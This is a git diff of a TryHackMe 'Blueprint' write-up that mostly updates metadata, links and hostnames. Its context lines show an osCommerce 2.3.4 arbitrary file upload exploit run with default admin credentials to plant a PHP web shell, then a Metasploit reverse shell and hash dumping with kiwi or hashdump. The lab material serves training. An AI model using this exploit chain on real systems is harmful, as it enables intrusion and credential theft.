@@ -4,31 +4,17 @@ date : 2021-07-09T12:14:38+02:00
 author : "Lanfran02"
 cover : "cover.jpeg"
 useRelativeCover : true
-description : "TryHackMe's medium level machine."
-tags : ["TryHackMe"]
+description : "TryHackMe's easy level machine."
+tags : ["osCommerce","nc","metasploit","kiwi","TryHackMe"]
 ---
 
 | Link | Level | Creator |
 |------|-------|---------|
-| [Here](https://tryhackme.com/room/)  | Medium  |  [user](https://tryhackme.com/p/)  |
-
-<!--
-description : "Maquina de nivel medio en TryHackMe."
-
-| Link | Nivel | Creador |
-|------|-------|---------|
-| [Aquí](https://tryhackme.com/room/)  | Medio  |  [user](https://tryhackme.com/p/)  |
-
-## Reconocimiento
-## Acceso inicial - Usuario
-
-
-¡Y hemos rooteado la máquina!
-
-Eso es todo de mi parte, ¡espero que lo encuentre útil!
--->
+| [Here](https://tryhackme.com/room/blueprint)  | Easy  |  [MrSeth6797](https://tryhackme.com/p/MrSeth6797)  |
 
 ## Reconn
+
+We ran a typical `nmap`
 
 ```bash
 ╰─ lanfran@parrot ❯ map 10.10.17.115                                                                                               ─╯
@@ -126,7 +112,7 @@ Great! We downloaded the exploit for Arbitrary File Upload
 
 ## Foothold - User
 
-Going to `http://10.10.17.115:8080/oscommerce-2.3.4/catalog/install/install.php` 
+Going to `http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/install.php`
 
 We can create a new installation, i used the following credentials:
 
@@ -135,13 +121,13 @@ We can create a new installation, i used the following credentials:
 After waiting a while, I used the credentials `admin:password` to configure the server.
 
 ```bash
-╰─ lanfran@parrot ❯ python 43191.py -f shell_online.php -u http://10.10.17.115:8080/oscommerce-2.3.4 --auth=admin:password            ─╯
+╰─ lanfran@parrot ❯ python 43191.py -f shell_online.php -u http://blueprint.thm:8080/oscommerce-2.3.4 --auth=admin:password            ─╯
 [+] Authentication successful
 [+] Successfully prepared the exploit and created a new newsletter with nID 1
 [+] Successfully locked the newsletter. Now attempting to upload..
 [*] Now trying to verify that the file shell_online.php uploaded..
 [+] Got a HTTP 200 Reply for the uploaded file!
-[+] The uploaded file should now be available at http://10.10.17.115:8080/oscommerce-2.3.4/catalog/admin/shell_online.php
+[+] The uploaded file should now be available at http://blueprint.thm:8080/oscommerce-2.3.4/catalog/admin/shell_online.php
 ```
 
 Great! Let's use `metasploit` to get a reverse shell.
@@ -204,7 +190,7 @@ THM{[REDACTED]}
 
 ## "Lab" user NTML hash decrypted
 
-To dump the hashes you can use `kiwi`, ot `hashdump`
+To dump the hashes you can use `kiwi`, or `hashdump`
 
 - With kiwi:
 ```bash
